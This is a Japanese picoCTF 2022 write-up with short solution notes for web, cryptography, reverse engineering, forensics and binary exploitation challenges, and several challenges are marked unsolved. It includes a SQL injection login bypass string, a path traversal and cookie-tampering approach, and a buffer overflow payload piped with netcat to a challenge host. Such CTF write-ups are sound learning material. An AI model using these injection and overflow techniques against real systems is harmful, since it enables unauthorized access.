# picoCTF2022 Write Up


## Web Exploitation
### Includes(100)
指定のwebに移動し、ブラウザのデベロッパー機能でjsとcssファイルを確認。フラグがコメントアウトされている。
### Inspect HTML(100)
指定のURLに移動し、ブラウザのデベロッパー機能でhtmlファイルを確認。フラグがコメントアウトされている。
### Local Authority(100)
適当にusernameとpasswordを入力すると認証が失敗する。そこで、ページのソースコードを見るとjsでusernameとpasswordがハードコーディングされている。
### Search source(100)
指定のURLに移動し、ブラウザのデベロッパー機能で色々なファイルを確認。「pico」などのワードで検索すると、あるcssファイルでヒットする。
### Forbidden Paths(200)
nginxを使用しており、flag.txtは`/flag.txt`にある。入力されたファイル名を処理する`read.php`は問題文に書かれている`/usr/share/nginx/html/`に配置されており、
相対パスを使用してflag.txtを参照する。
### Power Cookie(200)
chromeの拡張機能にcookieを編集できる`EditThisCookie`がある。webページのボタンをクリックするとcookieが設定され、adminを1にして更新すると、フラグを入手できる。
### Roboto Sans(200)
robots.txtを見て、暗号文を見つける。３行の暗号文だったので、１行ずつBase64でデコード。
2行目をデコードしたら、`js/myfile.txt`と出てきたので、そのURLにアクセス。
### Secrets(200)
ソースを見ると、`secert`folderがある。URLに`secret`を追加すると、さらに隠されたfolderがソースにある。これを繰り返すと、htmlにフラグが書かれていることを発見できる。
### SQL Direct(200)
PostgreSQLサーバに接続し、`psql`でデータベースの内容を調べていく。接続時に、`pico`dbにいる。db一覧を見てみる。
```
\l
```
他に３つのdbが確認できた。次に、table一覧を確認する。
```
/dt
```
`flags`と言う名前のtableを確認できた。このtableの内容をSQLクエリで確認する。
```
SELECT * FROM flags;
```
flagを確認できた。
### SQLiLite(300)
SQLインジェクション。試しに以下をやった。
```
username : "
password : "
```
ログインに失敗したが、SQLクエリが確認できた。login成功するには、例えば以下のようにできる。
```
username : ' or 1;
password : a
```
この場合、passwordは何でも良い。
### (unsolved)Live Art(500)
### (unsolved)noted(500)



## Cryptography
### basic-mod1(100)
問題のとおり。プログラムは`basic_mod1.py`を参照。
### basic-mod2(100)
モジュラ逆数を学ぶ。プログラムは`basic_mod2.py`を参照。
### credstuff(100)
`username.txt`から`cultiris`を見つけ、それに対応するパスワードを見つける。このパスワードはROT13でdecodeする。
### morse-code(100)
`Audacity`を使用して、英文モールスコードを参考に、変換。３つのアンダースコアがつく。
### rail-fence(100)
rail-fence 暗号。オンラインツールあり。
### substitution0(100)
換字式暗号の類でした。このサイトに入れるだけ。(https://www.guballa.de/substitution-solver)
### substitution1(100)
換字式暗号の類でした。このサイトに入れるだけ。(https://www.guballa.de/substitution-solver)。フラグの意味が通るように、J => Qとさらに変換。
### substitution2(100)
換字式暗号の類でした。このサイトに入れるだけ。(https://www.guballa.de/substitution-solver)
### transposition-trial(100)
空白を含めて、54文字ある。３ブロックに均等に分けると18文字のブロックができる。最初のブロックについて、順番を見つければ、それを他のブロックに適用できる。`transposition.py`を作成。
```
python transposition.py
```
### Vigenere(100)
ヴィジェネ暗号。オンラインツールあり。
### diffie-hellman(200)
DH秘密鍵共有プロトコルの概要を学ぶ。まず、DH秘密鍵を計算する。この秘密鍵はシーザー暗号のシフト量で相当するので、`0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ`という10進数の数字とalphabetの文字列に対して、暗号文をシフトする。プログラムは`dh.py`を参照。
### (unsolved)Very Smooth(300)
### (unsolved)Sequences(400)
### (unsolved)Sum-O-Primes(400)
### (unsolved)NSA Backdoor(500)


## Reverse Engineering
### file-run1(100)
実行可能権限を与えて、linux環境で実行するだけ。
```
chmod +x run
./run
```
### file-run2(100)
実行可能権限を与えて、linux環境で実行するだけ。実行時、引数に`Hello!`を渡す。
```
chmod +x run
./run Hello!
```
### GDB Test Drive(100)
以下のようにコマンド打つだけ。
```
$ chmod +x gdbme
$ gdb gdbme
(gdb) layout asm
(gdb) break *(main+99)
(gdb) run
(gdb) jump *(main+104)
```
### patchme.py(100)
同じdir内にpythonファイルと.encファイルをいれて、実行する。
パスワードは入力しても良いし、プログラムを編集しても良い。
### Safe Opener(100)
encodedkeyをBase64でdecodeする。
### unpackme.py(100)
変数の中身をチェック。
### bloat.py(200)
難解なコードになっているので、頑張って読む。パスフレーズを入力する必要があるので、何の文字列がif文で一致するか見つける。
### Fresh Java(200)
Javaプログラムをデコンパイルする。Ghidraは便利。
main関数を見てみると、if文でflagを検出している。
### Bbbbloat(300)
Ghidraでリバースエンジニアリングする。エントリーポイントを探し、処理の流れを追う。Linux環境で与えられたファイルを実行すると、数字を聞かれる。その部分の処理をみるとif文で`x86187`と同じかどうかをみていることがわかる。10進数に変換した値を入力する。
### unpackme(300)
実行権限を与えて、実行してみる。
```
chmod 777 unpackme-upx
./unpackme-upx
```
また数値を入力するようなので、デコンパイルしてみる。しかし、有用そうな箇所を見つけられなかった。ヒントのupzに注目する。
```
strings unpackme-upx
```
最後にupxの文字を見つけることができた。upxでunpackする。upxはaptでinstallできる。
```
sudo apt install upx
upx -d unpackme-upx
```
unpackされたunpackme-upxをghidraでデコンパイルする。そして、main関数をみると、標準入力の付近にif文があり、数値の比較がされている。`0xb83cb`を10進数に変換して入力するとフラグが現れた。
### (unsolved)Keygenme(400)
### (unsolved)Wizardlike(500)



## Forensics
### Enhance!(100)
macやlinuxなら、`strings`コマンドで見てみる。
```
strings "file name"
```
```<tspan>```タグで囲まれた部分にフラグが書かれている。
### File types(100)
txtファイルが何重にも圧縮されている。`file`コマンドでファイルタイプを確認し、解凍していく。以下は実際の解凍の流れ。  
shell => ar => cpio => bzip2 => g_zip => lzip => lz4 => lzma => lzop => lzip => XZ => ASCII text
```
sh flag.sh
ar -x flag
cpio -i < flag.cpio
bzip2 -dvk flag.bz2
gzip -d flag.gz
lzip --decompress flag.lz
lz4 -d flag.lz4
unlzma flag.lzma
lzop -d flag.lzo
lzip --decompress flag.lz
xz -dv flag.xz
```
最後のASCII textファイルは16進数になっているので、ASCII文字列に変換する。
### Lookey here(100)
エディタのファイル検索機能や`grep`コマンドを使用してフラグを探す。
### Packets Primer(100)
pcapファイルをwiresharkで読む。TCPストリームで見ると、フラグが見つかる。
### Redaction gone wrong(100)
pdfエディタで黒塗りの部分の文字列を選択&コピーし、どこかにpasteする。
### Sleuthkit Intro(100)
LinuxなどにSleuthkitを入れる。
```
mmls disk.img
```
指定されたURLとportに`netcat`でアクセスし、LinuxパーティションのLengthを入力する。
### (unsolved)Sleuthkit Apprentice(200)
### (unsolved)Eavesdrop(300)
### (unsolved)Operation Oni(300)
### (unsolved)St3g0(300)
### (unsolved)Operation Orchid(400)
### (unsolved)SideChannel(400)
### (unsolved)Torrent Analyze(400)


## Binary Exploitation
### basic-file-exploit(100)
プログラムを見ると、コマンド`2`で`flag`文字列をput出来そうなことがわかる。
`strtol()`関数はchar配列の数字をintの数字に変える？。返り値が0になるのは、数字に変換できずエラーになった時なので、文字列を打ち込めばよい。
### buffer overflow 0(100)
とりま,たくさんの文字を入力してみる。19文字以上の文字列では、SIGSEGVがトリガーされ、フラグが表示される。
### CVE-XXXX-XXXX(100)
問題文のCVEをググるだけ。
### buffer overflow 1(200)
このリンクをみてやり方を学ぶ。(https://qiita.com/Kuroakira/items/82446f083ee2fd05e925#%E7%8F%BE%E7%8A%B6%E3%82%92%E6%95%B4%E7%90%86)  
`gdb-peda`と`python2`を使用して、flagを出す。
```
chmod +x vuln
gdb vuln
gdb-peda$ disas win
gdb-peda$ b vuln
gdb-peda$ n
...
```
フラグの入手(python2系でやること！)。宛先アドレスはリトルエンディアンでかくこと。
```
python -c "print 'a' * 44 + '\xfa\x91\x04\x08';" | nc hostname port_number
```
### RPS(200)
`strstr()`の動作を知る。入力は、"rockpaperscissors"とし続ければ良い。
### (unsolved)x-sixty-what(200)
### (unsolved)buffer overflow 2(300)
### (unsolved)buffer overflow 3(300)
### (unsolved)flag leak(300)
### (unsolved)ropfu(300)
### (unsolved)wine(300)
### (unsolved)function overwrite(400)
### (unsolved)stack cache(400)
### (unsolved)solfire(500)
